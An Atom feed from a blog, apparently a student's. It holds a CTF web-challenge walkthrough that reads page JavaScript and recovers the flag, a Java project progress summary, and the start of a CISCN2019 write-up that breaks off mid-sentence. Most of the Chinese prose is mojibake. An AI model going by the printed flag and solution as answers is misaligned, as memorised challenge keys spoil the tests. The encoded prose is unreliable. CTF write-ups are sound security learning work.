<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>inanb</title>
  
  <subtitle>æ˜¨å¤œé›¨ç–é£éª¤ æµ“ç¡ä¸æ¶ˆæ®‹é…’</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-08-16T08:17:08.870Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>inanb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>b01lers2020-Welcome-to-Earth</title>
    <link href="http://example.com/2021/08/16/b01lers2020-Welcome-to-Earth/"/>
    <id>http://example.com/2021/08/16/b01lers2020-Welcome-to-Earth/</id>
    <published>2021-08-16T07:56:47.733Z</published>
    <updated>2021-08-16T08:17:08.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>js è§£å¯†</p><a id="more"></a></blockquote><h5 id="1-æ ¹ç•Œé¢"><a href="#1-æ ¹ç•Œé¢" class="headerlink" title="1. æ ¹ç•Œé¢"></a>1. æ ¹ç•Œé¢</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>AMBUSH!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You&#x27;ve gotta escape!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        event = event || <span class="built_in">window</span>.event;</span></span><br><span class="line">        if (event.keyCode == 27) &#123;</span><br><span class="line">          event.preventDefault();</span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.location = <span class="string">&quot;/chase/&quot;</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> die();</span></span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">dietimer</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">10000</span>);</span></span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">die</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      dietimer();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨1så†…é€ƒè·‘</p><h5 id="2-chase"><a href="#2-chase" class="headerlink" title="2. /chase/"></a>2. /chase/</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CHASE!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      You managed to chase one of the enemy fighters, but there&#x27;s a wall coming</span><br><span class="line">      up fast!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">dietimer</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">1000</span>);</span></span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">die</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">left</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">leftt</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/leftt/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">right</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      dietimer();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>äº‹ä»¶è§¦å‘ lefttâ€¦â€¦</p><h5 id="3-leftt"><a href="#3-leftt" class="headerlink" title="3. /leftt/"></a>3. /leftt/</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>SHOOT IT<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>You&#x27;ve got the bogey in your sights, take the shot!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;window.location=&#x27;/die/&#x27;&quot;</span>&gt;</span>Take the shot<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button onClick=&quot;window.location=&#x27;/shoot/&#x27;&quot;&gt;Take the shot&lt;/button&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>â€¦â€¦</p><h5 id="4-shoot"><a href="#4-shoot" class="headerlink" title="4. /shoot/"></a>4. /shoot/</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>YOU SHOT IT DOWN!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Well done! You also crash in the process<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;window.location=&#x27;/door/&#x27;&quot;</span>&gt;</span>Continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="5-door"><a href="#5-door" class="headerlink" title="5. /door/"></a>5. /door/</h5><p>å¾ˆå¤šæŒ‰é’®â€¦â€¦</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;check_door()&quot;</span>&gt;</span>Check<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç‚¹å‡»è§¦å‘äº‹ä»¶ï¼Œçœ‹å¼•å…¥çš„jsæ–‡ä»¶</p><p>door.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="built_in">document</span>.getElementById(<span class="string">&quot;door_form&quot;</span>).elements;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;</span><br><span class="line"></span><br><span class="line">  rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="built_in">window</span>.location = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="6-open"><a href="#6-open" class="headerlink" title="6. /open/"></a>6. /open/</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>YOU FOUND THE DOOR!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span>How do you open it?<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹å¼•å…¥çš„js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">1</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    open(i + <span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">4000000000</span>) <span class="built_in">window</span>.location = <span class="string">&quot;/fight/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="7-fight"><a href="#7-fight" class="headerlink" title="7. /fight/"></a>7. /fight/</h5><p>åˆæ˜¯ç‚¹å‡»è§¦å‘ï¼Œjsï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€œæ··æ·†â€äº†flagï¼Œç›´æ¥æ‰‹è§£ï¼špctf{hey_boys_im_baaaaaaaaaack!}</p><p>å¤§ä½¬çš„ python è„šæœ¬è§£æ³•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line"></span><br><span class="line">item = permutations(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item:</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line"><span class="keyword">if</span> k.startswith(<span class="string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="keyword">and</span> k[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">print(k)</span><br></pre></td></tr></table></figure><p>ç”¨çš„å…¨æ’åˆ—ï¼ŒğŸ‚</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://www.yuque.com/u390550/kdmol2/ul9gfw">qaq</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;js è§£å¯†&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>é¡¹ç›®å­¦ä¹ åˆæœŸå°èŠ‚</title>
    <link href="http://example.com/2021/08/15/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/"/>
    <id>http://example.com/2021/08/15/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/</id>
    <published>2021-08-15T07:27:51.835Z</published>
    <updated>2021-08-16T07:55:52.864Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>å®éªŒå®¤Javaé¡¹ç›®ï¼Œå­¦ä¹ å°ç»“</p><a id="more"></a><p>è¯è¯´è¿™æ˜¯ä¿¡æ¯å®‰å…¨å®éªŒå®¤çš„å¼€å‘é¡¹ç›®ï¼Œemmmâ€¦â€¦</p></blockquote><blockquote><p>å­¦ä¹ èµ„æº:<br><a href="https://www.bilibili.com/video/BV1CJ411m7gg">æ±‚çŸ¥è®²å ‚Javaè§†é¢‘</a> (98/120)</p><p><a href="https://www.bilibili.com/video/BV18s411u7EH">JavaWebè§†é¢‘æ•™ç¨‹</a> (31/68)</p><p><a href="https://www.bilibili.com/video/BV177411s7Lt">Electronå…è´¹è§†é¢‘æ•™ç¨‹-ä»åŸºç¡€åˆ°å®æˆ˜</a> (1/17)</p><p>å®Œï¼Œå†™å°ç»“çš„æ—¶å€™æ„Ÿè§‰çŸ¥è¯†å·²ç»å¼€å§‹å¿˜äº†â€¦â€¦ğŸ¤£</p></blockquote><blockquote><p><strong>æè¿°</strong>ï¼šç¾å®¹é™¢ç®¡ç†ç³»ç»Ÿ</p><p><strong>åˆæœŸç›®æ ‡</strong>ï¼šå®ç°å…¶ä¸­çš„å•†å“ç®¡ç†ç³»ç»Ÿï¼Œå³å¢ã€åˆ ã€æ”¹ã€æŸ¥</p></blockquote><h4 id="åŸºç¡€çŸ¥è¯†ï¼š"><a href="#åŸºç¡€çŸ¥è¯†ï¼š" class="headerlink" title="åŸºç¡€çŸ¥è¯†ï¼š"></a>åŸºç¡€çŸ¥è¯†ï¼š</h4><p><strong>JavaåŸºæœ¬çŸ¥è¯†çš„å­¦ä¹ ï¼š</strong><a href="https://www.bilibili.com/video/BV1CJ411m7gg">æ±‚çŸ¥è®²å ‚Javaè§†é¢‘</a> (98/120)</p><ul><li>æƒ…å†µï¼šæŒæ¡äº†åŸºæœ¬çš„è¯­æ³•ï¼Œäº†è§£äº†ä¸€äº›è®¾è®¡æ¨¡å¼ï¼Œé¢å‘å¯¹è±¡ç¼–ç¨‹æ·±å…¥æˆ‘å¿ƒï¼Œè¿˜éœ€å­¦ä¹ é¢å‘æ¥å£ç¼–ç¨‹ï¼Œéœ€è¦å¤ä¹ â€¦â€¦</li></ul><p>ç­‰æˆ‘å­¦å®Œï¼Œæ•´ç†ä¸‹ç¬”è®°å‘å‡ºæ¥å§â€¦â€¦æŒºå¤šçš„</p><p><strong>JavawebçŸ¥è¯†å­¦ä¹ ï¼š</strong><a href="https://www.bilibili.com/video/BV18s411u7EH">JavaWebè§†é¢‘æ•™ç¨‹</a> (31/68)</p><ul><li>æƒ…å†µï¼šçº ç»“å¥½ä¹…ï¼Œå†³å®šä»jspå¼€å§‹ã€‚å­¦ä¹ äº†jspã€JavaBeanã€jdbcã€servletã€åŸºç¡€æ¶æ„çŸ¥è¯†ï¼›æœ¬æ¬¡é¡¹ç›®ä¹Ÿæ˜¯è·Ÿç€è§†é¢‘å­¦åˆ°ä¸€å®šç¨‹åº¦æ‰“å‡ºæ¥çš„â€¦â€¦</li></ul><p>ç›®å‰æ— ç¬”è®°â€¦â€¦æ‡’çˆ†â€¦â€¦æƒ³æŠŠJavaåŸºç¡€å…ˆæ•´å¥½</p><p><strong>sqlåŸºç¡€çŸ¥è¯†ï¼š</strong>æ— </p><ul><li>æƒ…å†µï¼šâ€¦â€¦åŠåŠå­ä¸å¦‚çš„æ°´å¹³ï¼ŒåŸºæœ¬äº†è§£ä¹Ÿæ˜¯å­¦ä¹ sqlæ³¨å…¥çš„æ—¶å€™çŸ¥é“çš„ï¼Œä¹Ÿæ¶‰åŠä¸åˆ°å¤æ‚sqlâ€¦â€¦åè€Œå®é™…çš„å¼€å‘è®©æˆ‘æ›´åŠ äº†è§£äº†æ™®é€šçš„æ³¨å…¥åœºæ™¯â€”â€”é¢„ç¼–è¯‘ğŸ˜‘</li></ul><p>æ›´åŠ æ— ç¬”è®°ï¼Œå­¦æ ¡è®¡ç§‘ä¸“ä¸šç”šè‡³æ— æ•°æ®åº“çš„è¯¾â€¦â€¦</p><p><strong>å‰ç«¯åŸºç¡€çŸ¥è¯†ï¼š</strong></p><ul><li>æƒ…å†µï¼šjså­¦è‰ºä¸ç²¾â€¦â€¦ä¹‹å‰çœ‹äº†åå‡ èŠ‚è¯¾ï¼Œå› æœ‰äº‹è€Œææµ…ï¼›cssä¹Ÿå­¦è‰ºä¸ç²¾â€¦â€¦ç›®å‰æ˜¯æ‰¾åˆ°ä¸é”™çš„æ¨¡æ¿ï¼Œå¯ä»¥å€ŸåŠ©æœç´¢å¼•æ“è¾¾åˆ°æˆ‘æƒ³è¦çš„æ•ˆæœâ€¦â€¦åˆšåˆšèƒ½çœ‹æ‡‚çš„æ°´å¹³ï¼Ÿ</li></ul><p>å®³â€¦â€¦</p><p><strong>Electronï¼Ÿ</strong></p><ul><li>æƒ…å†µï¼šåªæ˜¯ä¸ºäº†ä¾¿äºæµè§ˆæ‰¾åˆ°çš„å®¢æˆ·ç«¯åˆ¶ä½œå·¥å…·â€¦â€¦<strong>åªçœ‹äº†ä¸€é›†</strong>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œ<strong>jsçœŸå¿ƒnb</strong>ï¼Œæˆ‘è¦å¥½å¥½å­¦â€¦â€¦è¿˜æœ‰<strong>python</strong>â€¦â€¦æ„Ÿè§‰å­¦ä¸å®Œäº†ï¼Œæˆ‘è¿˜<strong>å¤©å¤©ç©</strong>ğŸ•</li></ul><p>ç©æ‰‹æœºâ€¦â€¦å˜¿å˜¿ğŸ¤¤</p><h4 id="é¡¹ç›®ä»‹ç»"><a href="#é¡¹ç›®ä»‹ç»" class="headerlink" title="é¡¹ç›®ä»‹ç»"></a>é¡¹ç›®ä»‹ç»</h4><blockquote><p>å¼€å‘å·¥å…·ï¼šeclipse</p><p>æœåŠ¡å™¨ï¼štomcat</p><p>servletï¼š3.0</p><p>æ•°æ®åº“ï¼šsqlite</p><p>æ¡Œé¢å®¢æˆ·ç«¯ï¼šElectron</p><p>æ¶æ„ï¼šâ€”â€”<strong>ä¸‰å±‚æ¶æ„</strong>ï¼š</p><p>â€‹                    â€“<strong>è¡¨ç¤ºå±‚</strong> ï¼š ã€å‰å°ã€‘ï¼šjspã€cssã€jsâ€¦â€¦ + ã€åå°ã€‘ï¼šservlet </p><p>â€‹                    â€“<strong>ä¸šåŠ¡é€»è¾‘å±‚</strong>ï¼š service</p><p>â€‹                    â€“<strong>æ•°æ®è®¿é—®å±‚</strong>ï¼š Dao</p><p>ç°æœ‰åŠŸèƒ½ï¼š-å¯¹å•†å“çš„å¢åˆ æ”¹æŸ¥</p><p>â€‹                    -ä»¥å•†å“ç¼–å·ä¸ºå”¯ä¸€ä¸»é”®è¿›è¡Œç»Ÿä¸€ç®¡ç†</p></blockquote><p><img src="/images/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/clip_image002.jpg" alt="img"></p><h3 id="é¡¹ç›®éƒ¨ç½²"><a href="#é¡¹ç›®éƒ¨ç½²" class="headerlink" title="é¡¹ç›®éƒ¨ç½²"></a>é¡¹ç›®éƒ¨ç½²</h3><p><img src="/images/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/image-20210815184343455.png" alt="image-20210815184343455"></p><ul><li>run.exeç”±test.vbsç¼–è¯‘è€Œæ¥</li><li>test.vbsæ— çª—å£è°ƒç”¨test.bat</li><li>batä¾æ¬¡è®¾ç½®ç¯å¢ƒå˜é‡ã€å¯åŠ¨tomcatã€å¯åŠ¨electron</li></ul><p>éƒ¨ç½²ç»†èŠ‚ï¼š</p><ul><li>é»˜è®¤æœåŠ¡å¼€åœ¨8888ç«¯å£</li><li>ä¼šåœ¨Dç›˜ä¸‹ç”Ÿæˆproject.dbä½œä¸ºæ•°æ®åº“</li><li>æœåŠ¡å…³é—­éœ€å…³é—­ javaw æœåŠ¡ ä¸ electron</li><li>æ¡ä»¶ç¬¦åˆè§£å‹åå³å¯ä½¿ç”¨</li></ul><h4 id="é¡¹ç›®åˆæœŸæ¼”ç¤º"><a href="#é¡¹ç›®åˆæœŸæ¼”ç¤º" class="headerlink" title="é¡¹ç›®åˆæœŸæ¼”ç¤º"></a>é¡¹ç›®åˆæœŸæ¼”ç¤º</h4><div style="width:100%;height:0px;position:relative;padding-bottom:56.327%;"><iframe src="https://streamja.com/embed/JLP6G" frameborder="0" width="100%" height="100%" allowfullscreen style="width:100%;height:100%;position:absolute;"></iframe></div><blockquote><p>qqå½•å±æ ¼å¼ä¸å¯¹ï¼Œç”±ç¢°ä¸Šæ–­ç½‘â€¦â€¦æ•´äº†è€åŠå¤©â€¦â€¦æ— è¯­</p><p>æƒ³ç”¨ä¸ƒç‰›äº‘åšä¸ªå›¾åºŠï¼Œç»“æœè¦å¤‡æ¡ˆåŸŸåï¼Œè‡³å°‘è¦ä¸ƒå¤©â€¦â€¦ å…è´¹å›¾åºŠ+streamjaå°±æŒºé¦™çš„ï¼Œä¸çŸ¥é“è´¹åŠå¤©åŠ²å¹²ä»€ä¹ˆğŸ™„</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;å®éªŒå®¤Javaé¡¹ç›®ï¼Œå­¦ä¹ å°ç»“&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019-åä¸œå—èµ›åŒº-Double-Secret</title>
    <link href="http://example.com/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
    <id>http://example.com/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</id>
    <published>2021-05-14T06:28:06.000Z</published>
    <updated>2021-05-14T06:38:42.587Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h3><p>Welcome To Find Secret</p><p>è®°å½•ä¸€ä¸‹â€¦â€¦</p><p>å¯»æ‰¾secretâ€¦â€¦æ‰«ä¸å‡ºåå°ï¼Œrobotsé¡µé¢ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨â€¦â€¦</p><p>å°è¯•å‘ç°secreté¡µé¢ï¼š</p><img src="/images/CISCN2019-åä¸œå—èµ›åŒº-Double-Secret/image-20210514143307636.png" alt="image-20210514143307636" style="zoom:80%;" /><p>æäº¤å‚æ•°secretï¼š</p><p>éšä¾¿è¾“å…¥æŠ¥é”™ï¼š</p><img src="/images/CISCN2019-åä¸œå—èµ›åŒº-Double-Secret/image-20210514143408872.png" alt="image-20210514143408872" style="zoom:80%;" /><p>rc4ä¼¼ä¹æ˜¯éœ€è¦å¯†é’¥çš„ä¸€ç§åŠ 